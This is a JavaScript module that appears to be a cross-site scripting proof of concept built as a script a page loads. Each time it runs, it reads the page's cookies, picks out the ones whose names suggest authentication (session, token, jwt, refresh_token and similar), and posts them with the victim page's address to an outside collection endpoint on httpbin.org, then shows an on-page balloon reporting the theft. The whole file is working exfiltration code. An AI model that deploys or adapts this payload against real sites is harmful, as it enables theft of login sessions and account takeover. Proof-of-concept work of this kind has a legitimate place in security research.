define([], function () {
  var HTTPBIN_BASE = "https://httpbin.org/anything/cp-hash-loader";
  var AUTH_COOKIE_HINTS = [
    "sess",
    "session",
    "auth",
    "token",
    "jwt",
    "sid",
    "sso",
    "identity",
    "account",
    "login",
    "logged",
    "remember",
    "id_token",
    "access_token",
    "refresh_token"
  ];

  function nowIso() {
    return new Date().toISOString();
  }

  function safeCall(fn, fallback) {
    try {
      return fn();
    } catch (e) {
      return fallback;
    }
  }

  function parseCookies() {
    var raw = safeCall(function () {
      return document.cookie || "";
    }, "");
    if (!raw) {
      return [];
    }
    return raw
      .split(";")
      .map(function (part) {
        var t = part.trim();
        var eq = t.indexOf("=");
        if (eq < 0) {
          return { name: t, value: "" };
        }
        return {
          name: t.slice(0, eq),
          value: t.slice(eq + 1)
        };
      })
      .filter(function (cookie) {
        return cookie.name;
      });
  }

  function isAuthCookieName(name) {
    var low = (name || "").toLowerCase();
    for (var i = 0; i < AUTH_COOKIE_HINTS.length; i++) {
      if (low.indexOf(AUTH_COOKIE_HINTS[i]) !== -1) {
        return true;
      }
    }
    return false;
  }

  function collectAuthCookies(cookies) {
    return cookies.filter(function (cookie) {
      return isAuthCookieName(cookie.name);
    });
  }

  function makeSessionId() {
    var rnd = Math.random().toString(36).slice(2, 10);
    return "cp" + Date.now().toString(36) + rnd;
  }

  function writeToHttpbin(url, payload) {
    var body = safeCall(function () {
      return JSON.stringify(payload);
    }, "{}");

    return fetch(url, {
      method: "POST",
      mode: "cors",
      credentials: "omit",
      cache: "no-store",
      keepalive: true,
      headers: {
        "Content-Type": "text/plain;charset=UTF-8"
      },
      body: body
    })
      .then(function (response) {
        return response.text().then(function (text) {
          var parsed = safeCall(function () {
            return JSON.parse(text);
          }, null);
          return {
            ok: response.ok,
            status: response.status,
            requestUrl: url,
            echoedUrl: parsed && parsed.url ? parsed.url : url
          };
        });
      });
  }

  function upsertSpeechBalloon(title, link, statusText, isError) {
    var balloonId = "cp-httpbin-balloon";
    var titleId = "cp-httpbin-balloon-title";
    var linkId = "cp-httpbin-balloon-link";
    var statusId = "cp-httpbin-balloon-status";
    var balloon = document.getElementById(balloonId);

    if (!balloon) {
      balloon = document.createElement("div");
      balloon.id = balloonId;
      balloon.style.position = "fixed";
      balloon.style.right = "22px";
      balloon.style.bottom = "24px";
      balloon.style.maxWidth = "420px";
      balloon.style.padding = "12px 14px";
      balloon.style.background = "#0b1022";
      balloon.style.color = "#e6ecff";
      balloon.style.border = "1px solid #5aa0ff";
      balloon.style.borderRadius = "12px";
      balloon.style.boxShadow = "0 10px 28px rgba(0, 0, 0, 0.45)";
      balloon.style.font = "12px/1.45 monospace";
      balloon.style.zIndex = "2147483647";

      var tail = document.createElement("div");
      tail.style.position = "absolute";
      tail.style.right = "30px";
      tail.style.bottom = "-8px";
      tail.style.width = "16px";
      tail.style.height = "16px";
      tail.style.background = "#0b1022";
      tail.style.borderRight = "1px solid #5aa0ff";
      tail.style.borderBottom = "1px solid #5aa0ff";
      tail.style.transform = "rotate(45deg)";
      tail.style.zIndex = "-1";
      balloon.appendChild(tail);

      var titleEl = document.createElement("div");
      titleEl.id = titleId;
      titleEl.style.fontWeight = "700";
      titleEl.style.marginBottom = "5px";
      balloon.appendChild(titleEl);

      var linkEl = document.createElement("a");
      linkEl.id = linkId;
      linkEl.target = "_blank";
      linkEl.rel = "noreferrer noopener";
      linkEl.style.display = "block";
      linkEl.style.marginBottom = "6px";
      linkEl.style.wordBreak = "break-all";
      linkEl.style.color = "#9fd0ff";
      linkEl.style.textDecoration = "underline";
      balloon.appendChild(linkEl);

      var statusEl = document.createElement("div");
      statusEl.id = statusId;
      balloon.appendChild(statusEl);

      document.documentElement.appendChild(balloon);
    }

    var titleNode = document.getElementById(titleId);
    var linkNode = document.getElementById(linkId);
    var statusNode = document.getElementById(statusId);

    if (titleNode) {
      titleNode.textContent = title || "PoC";
    }
    if (linkNode) {
      linkNode.href = link || "#";
      linkNode.textContent = link || "no link";
    }
    if (statusNode) {
      statusNode.textContent = statusText || "";
      statusNode.style.color = isError ? "#ffafaf" : "#7cffb4";
    }
    if (balloon) {
      balloon.style.borderColor = isError ? "#ff8080" : "#5aa0ff";
    }
  }

  function executePoC() {
    var ts = nowIso();
    var cookies = parseCookies();
    var authCookies = collectAuthCookies(cookies);
    var session = makeSessionId();
    var requestUrl = HTTPBIN_BASE + "/" + session;

    var marker = {
      executed: true,
      ts: ts,
      origin: window.location.origin,
      href: window.location.href
    };

    window.__CP_POC_MARKER__ = marker;
    safeCall(function () {
      localStorage.setItem("cp_poc_marker", JSON.stringify(marker));
    }, null);

    var payload = {
      event: "cp_hash_loader_auth_cookie_httpbin",
      marker: {
        executed: true,
        ts: ts,
        victimOrigin: window.location.origin,
        victimHref: window.location.href
      },
      authCookies: authCookies,
      authCookieCount: authCookies.length,
      note: "Only non-HttpOnly cookies readable from current site are included."
    };

    window.__CP_POC_HTTPBIN_URL__ = requestUrl;
    window.__CP_POC_AUTH_COOKIES__ = authCookies;

    upsertSpeechBalloon(
      "XSS executed at " + ts,
      requestUrl,
      "Posting auth cookies to httpbin...",
      false
    );

    writeToHttpbin(requestUrl, payload)
      .then(function (delivery) {
        window.__CP_POC_DELIVERY__ = delivery;
        upsertSpeechBalloon(
          "HTTPBIN saved",
          delivery.echoedUrl || requestUrl,
          "Status: " + delivery.status,
          !delivery.ok
        );
      })
      .catch(function (err) {
        window.__CP_POC_DELIVERY__ = {
          ok: false,
          status: 0,
          requestUrl: requestUrl,
          error: String(err && err.message ? err.message : err)
        };
        upsertSpeechBalloon(
          "HTTPBIN write failed",
          requestUrl,
          "Error: " + window.__CP_POC_DELIVERY__.error,
          true
        );
      });

    return marker;
  }

  executePoC();

  return {
    version: "104.0.0-httpbin-auth-cookie-balloon",
    render: function () {
      return executePoC();
    }
  };
});
